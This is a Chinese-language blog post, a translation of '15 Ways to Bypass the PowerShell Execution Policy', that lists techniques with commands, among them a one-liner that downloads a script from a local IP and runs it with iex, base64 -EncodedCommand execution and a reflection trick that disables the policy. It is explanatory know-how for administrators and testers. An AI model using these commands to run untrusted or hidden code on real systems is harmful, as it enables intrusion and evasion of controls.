@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="dns-prefetch" href="http://www.lovebear.top">
+  <title>绕过PowerShell 执行策略的15种方法 | Blog for You</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。">
+<meta name="keywords" content="shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过PowerShell 执行策略的15种方法">
+<meta property="og:url" content="http://www.lovebear.top/2020/02/16/PowerShell_15_Ways_Bypass_ExecutionPolicy/index.html">
+<meta property="og:site_name" content="Blog for You">
+<meta property="og:description" content="前言在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/1.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/2.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/3.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/4.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/5.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/6.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/7.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/8.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/9.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/10.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/11.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/12.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/13.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/14.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/15.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/16.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/17.png">
+<meta property="og:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/18.png">
+<meta property="og:updated_time" content="2020-02-16T09:16:20.417Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绕过PowerShell 执行策略的15种方法">
+<meta name="twitter:description" content="前言在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。">
+<meta name="twitter:image" content="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Blog for You" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
+  
+
+  
+
+  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc">
+  <script>(function(){
+var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?1bc693950a04b443481f93da0209d936":"https://jspassport.ssl.qhimg.com/11.0.1.js?1bc693950a04b443481f93da0209d936";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+  <script src="/js/jquery.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-134162688-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-134162688-1');
+</script>
+
+</head>
+<script src="/js/instant.js" type="module"></script>
+
+</html>
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="http://lovebear.top/img/head.jfif" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">lovebear</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">someone there for you</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+		        
+					<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+		        
+					<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">lovebear</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="http://lovebear.top/img/head.jfif" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">lovebear</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">someone there for you</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+			        
+						<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-PowerShell_15_Ways_Bypass_ExecutionPolicy" class="article article-type-post " itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      绕过PowerShell 执行策略的15种方法
+    </h1>
+  
+
+        <a href="/2020/02/16/PowerShell_15_Ways_Bypass_ExecutionPolicy/" class="archive-article-date">
+  	<time datetime="2020-02-16T08:00:24.697Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，<br>是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。<br>我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。</p>
+<a id="more"></a>
+<h2 id="什么是PowerShell执行策略"><a href="#什么是PowerShell执行策略" class="headerlink" title="什么是PowerShell执行策略"></a>什么是PowerShell执行策略</h2><p>PowerShell执行策略是用来限制哪些类型的PowerShell脚本能在系统上直接运行。默认它的设置时Restricted，<br>即任何脚本都不行。但是，我们需要明确该设置从来都没打算设计成为一个安全控制策略，<br>相反，它本来是为了防止系统管理员发生搬起石头砸自己的脚的情况。这就是为什么有许多围绕它的选项。<br>其中包括一些微软自身提供的。若想了解更多PowerShell的执行策略设置和其他默认安全设置，我推荐你读Carlos Perez的博客，<br>它提供了一个比较全面的概述。</p>
+<h2 id="为什么我想绕过执行策略"><a href="#为什么我想绕过执行策略" class="headerlink" title="为什么我想绕过执行策略"></a>为什么我想绕过执行策略</h2><p>为什么PowerShell如此流行，我听到过不少的答案，最常听到就是它可以实现自动化，以下是一些管理员，渗透测试人员，黑客之所以喜欢它的一些原因：</p>
+<ul>
+<li>是Windows原生的</li>
+<li>可以调用Windows API</li>
+<li>不需要写入磁盘就可以执行命令</li>
+<li>可以逃避Anti-Virus的检测</li>
+<li>被大多数程序加入白名单中，标记为可信的</li>
+<li>有许多开源的渗透工具集</li>
+</ul>
+<h2 id="如何察看当前安全策略"><a href="#如何察看当前安全策略" class="headerlink" title="如何察看当前安全策略"></a>如何察看当前安全策略</h2><p>在使用PowerShell的所有惊奇的特性前，攻击者要做的第一件事就是绕过Restricted执行策略。<br>可以通过命令Get-ExectionPolicy来获得当前策略。如果你是第一次使用这个命令，则应该是设置为Restricted的，如下：</p>
+<pre><code>PS C:\&gt; Get-ExecutionPolicy
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/1.png" alt="demo"></p>
+<p>同样可以将执行策略设置为不同的级别。如下查看支持的所有级别，若想了解更多关于”Set-ExecutionPolicy”的信息，查看 Set-ExecutionPolicy</p>
+<pre><code>PS C:\&gt; Get-ExecutionPolicy -List | Format-Table -AutoSize
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/2.png" alt="demo"></p>
+<h2 id="实验环境设置"><a href="#实验环境设置" class="headerlink" title="实验环境设置"></a>实验环境设置</h2><p>我会使用如下一个脚本来作为例子,runme.ps1，该明白用来向控制台输出一句话：</p>
+<pre><code>Write-Host &quot;My voice is my passport, verify me.&quot;
+</code></pre><p>当我在默认策略的主机上，尝试执行该脚本时，会出现如下错误：</p>
+<p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/3.png" alt="demo"></p>
+<p>如果你的策略太open，你想使用更严格的方式来测试如下的方案，你需要切换到管理员身份，执行Set-ExecutionPolicy Restricted。OK，接下来是15种方式：</p>
+<h2 id="15种绕过方式"><a href="#15种绕过方式" class="headerlink" title="15种绕过方式"></a>15种绕过方式</h2><ol>
+<li>将你的脚本内容粘贴到一个交互式的PowerShell窗口中</li>
+</ol>
+<p>如下，将你的脚本粘贴到console中。但是，你要记住，你的受限程度取决于你当前用户的权限。假如你有一个可以交互式的窗口，则这是最基本的一种方法，而且不需要做任何的配置改变和写入到磁盘中。</p>
+<p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/4.png" alt="demo"></p>
+<ol start="2">
+<li>Echo脚本内容，然后Pipe到PowerShell的标准输入中</li>
+</ol>
+<pre><code>Echo Write-Host &quot;My voice is my passport, verify me.&quot;  | PowerShell.exe -noprofile -
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/5.png" alt="demo"></p>
+<ol start="3">
+<li>从一个文件中读取脚本，然后Pipe到PowerShell的标准输入中</li>
+</ol>
+<p>此方法有个缺点就是会写入脚本到本地磁盘中，但是你可以从一个网络共享中读取脚本，来避免写内容到磁盘中。</p>
+<pre><code>PS C:\temp&gt; Get-Content .\runme.ps1 | powershell.exe -noprofile -
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/6.png" alt="demo"></p>
+<pre><code>PS C:\temp&gt; Type .\runme.ps1 | powershell.exe -noprofile -
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/7.png" alt="demo"></p>
+<ol start="4">
+<li>从一个URL Download脚本内容，然后执行</li>
+</ol>
+<pre><code>PS C:\temp&gt; powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.2/runme.ps1&#39;)&quot;
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/8.png" alt="demo"></p>
+<ol start="5">
+<li>使用-command命令参数</li>
+</ol>
+<p>此方法和直接粘贴脚本内容执行的方式很像，但是此方法不需要一个交互式的窗口。它适用于简单脚本的执行，对于复杂脚本会发生解析错误。该方法同样不会写内容到磁盘中。</p>
+<pre><code>powershell -command &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot;
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/9.png" alt="demo"></p>
+<p>短命令：</p>
+<pre><code>powershell -c &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot;
+</code></pre><p>你可以将该命令写到一个bat文件中，然后放到启动目录中，来帮助提权。</p>
+<ol start="6">
+<li>使用-encodedCommand命令参数</li>
+</ol>
+<p>该方法和上一个方法很相似，但是此方式脚本内容是Unicode/base64 encode的字符串。使用编码的好处是可以让你避免执行使用Command参数时产生一些糟糕的解析问题。以下的例子是摘自Posh-SecMod。该工具套件还包括一个小的压缩方法来减少由于encode后字符串太长的情况。</p>
+<pre><code>$command = &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot;
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $encodedCommand
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/10.png" alt="demo"></p>
+<p>短命令</p>
+<pre><code>powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
+</code></pre><ol start="7">
+<li>使用Invoke-Command 命令</li>
+</ol>
+<p>该方法最cool点在于对抗那些PowerShell remoting开启的Remote系统。</p>
+<pre><code>invoke-command -scriptblock {Write-Host &quot;My voice is my passport, verify me.&quot;}
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/11.png" alt="demo"></p>
+<p>如下命令，可用来从一个远程系统上抓取执行策略同时运用到本地计算机中.</p>
+<pre><code>invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
+</code></pre><ol start="8">
+<li>使用 Invoke-Expression 命令</li>
+</ol>
+<pre><code>PS C:\temp&gt; Get-Content ./runme.ps1 | Invoke-Expression
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/12.png" alt="demo"></p>
+<p>短命令</p>
+<pre><code>PS C:\temp&gt; gc .\runme.ps1 | iex
+</code></pre><ol start="9">
+<li>使用Bypass执行策略标志</li>
+</ol>
+<p>这个方法是微软提供的用来绕过执行策略的一种方式。当指定该标志后，即视为什么都不做，什么警告也不提示。</p>
+<pre><code>powershell -ExecutionPolicy bypass -File ./runme.ps1
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/13.png" alt="demo"></p>
+<ol start="10">
+<li>使用Unrestricted执行策略标志</li>
+</ol>
+<p>该标志和bypass很像，但是当使用该标志时，即意味着加载所有的配置文件和执行所有的脚本。如果你运行一个从网上下载的未签名的脚本，会给出权限提示。</p>
+<pre><code>powershell -ExecutionPolicy unrestricted -File ./runme.ps1
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/14.png" alt="demo"></p>
+<ol start="11">
+<li>使用Remote-Signed执行策略标志</li>
+</ol>
+<p>创建你的脚本，然后按指南签名。最后运行:</p>
+<pre><code>PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
+</code></pre><ol start="12">
+<li>通过换出认证管理器，禁用执行策略</li>
+</ol>
+<p>非常有创造性的一个。如下函数可以在交互式窗口中使用，也可以在Command参数中指定。一旦该函数被执行，则会换出认证管理器，同时默认策略改为unrestricted。但是该方法只在一个会话范围内有效。</p>
+<pre><code>function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield(&quot;_context&quot;,&quot;nonpublic,instance&quot;).getvalue( $executioncontext)).gettype().getfield(&quot;_authorizationManager&quot;,&quot;nonpublic,instance&quot;).setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager &quot;Microsoft.PowerShell&quot;))}  Disable-ExecutionPolicy  ./runme.ps1
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/15.png" alt="demo"></p>
+<ol start="13">
+<li>设置执行策略为Process作用域</li>
+</ol>
+<p>我们之前介绍中提到过，执行策略可以应用到过个级别。其中就包括你完全控制的process。使用该方法仅限于当前session中，执行策略会变为unrestricted。</p>
+<pre><code>Set-ExecutionPolicy Bypass -Scope Process
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/16.png" alt="demo"></p>
+<ol start="14">
+<li>通过命令设置执行策略为CurrentUser作用域</li>
+</ol>
+<pre><code>Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/17.png" alt="demo"></p>
+<ol start="15">
+<li>通过注册表设置执行策略为CurrentUser作用域</li>
+</ol>
+<p>该方法和Process作用域方法很相似，但是通过修改注册表Key可将设置持续应用到当前用户的环境中。</p>
+<pre><code>HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
+</code></pre><p><img src="http://lovebear.top/img/PowerShell_15_Ways_Bypass_ExecutionPolicy/18.png" alt="demo"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该主题的目的是为了让执行策略不再成为程序员，管理员或渗透测试人员的一个障碍。微软同样也没有打算将其设置为一个安全控制。<br>这就是为什么有如此多的方法来绕过它。微软也提供了一些本地选项，安全社区中同样有许多有意思的tricks。</p>
+<p>最后，祝在PowerShell冒险中好运，别忘了为你的Hack行为负责。</p>
+<p>——————————<br>原文链接: 15 Ways to Bypass the PowerShell Execution Policy</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://lovebear.top/img/url_zhifubao.JPG">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/">shell</a></li></ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2020/02/16/PowerShell_15_Ways_Bypass_ExecutionPolicy/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/15/PHP_CutOff_Bypass/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP截断绕过总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:rgb(255, 255, 255)}
+        @media screen and (max-width:400px){.comments{margin:auto;padding:10px;background:rgb(214, 252, 203)}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'false' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "J3JcKBL0IxtN9XJWzPrnegcB-gzGzoHsz",
+        app_key: "ewqKho2b8ByxHacJAjmvq5ur",
+        placeholder: "请留下宝贵的评论",
+        avatar:"retro",
+    });
+</script>
+
+    </section>
+  
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2020 lovebear
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Lovebear
+      	</div>
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+		</script>
+		<span id="busuanzi_container_site_pv">
+			Total Visit: <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> times
+		</span>
+		<script>
+			(function(){
+				var bp = document.createElement('script');
+				var curProtocol = window.location.protocol.split(':')[0];
+				if (curProtocol === 'https'){
+					bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+				}
+				else{
+					bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+				}
+				var s = document.getElementsByTagName("script")[0];
+				s.parentNode.insertBefore(bp, s);
+			})();
+		</script>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: true,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Apache</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">BGP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">md5</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">大数据</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Julia</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">mysql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">DataBase</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">image</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pacman</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">shell</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: true
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="https://github.com/litten/hexo-theme-yilia" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>hexo主题</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>不如</a>
+            </li>
+          
+            <li class="search-li">
